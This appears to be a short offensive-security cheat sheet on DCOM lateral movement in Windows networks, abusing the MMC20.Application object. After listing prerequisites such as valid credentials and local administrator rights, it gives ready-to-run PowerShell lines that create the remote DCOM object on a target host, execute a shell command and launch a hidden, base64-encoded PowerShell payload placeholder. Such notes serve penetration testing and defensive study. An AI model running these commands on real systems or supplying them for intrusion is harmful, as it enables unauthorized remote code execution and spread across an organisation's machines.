DCOM (Distributed Component Object Model)

DCOM is a Microsoft technology that extends COM to allow remote execution of COM objects over RPC. Attackers abuse COM objects such as MMC20.Application to execute commands on remote Windows hosts without creating services or copying executables, making it a common lateral movement technique.

Requirements

  • Valid credentials.
  • Local Administrator on the target host.
  • DCOM enabled (default).
  • RPC (TCP/135 + dynamic RPC ports) accessible.

Create Remote DCOM Object

Use the name or IP address of the target.

$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","FILES04"))

Execute Command

$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")

Execute PowerShell Payload

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"-nop -w hidden -e <BASE64_PAYLOAD>","7")
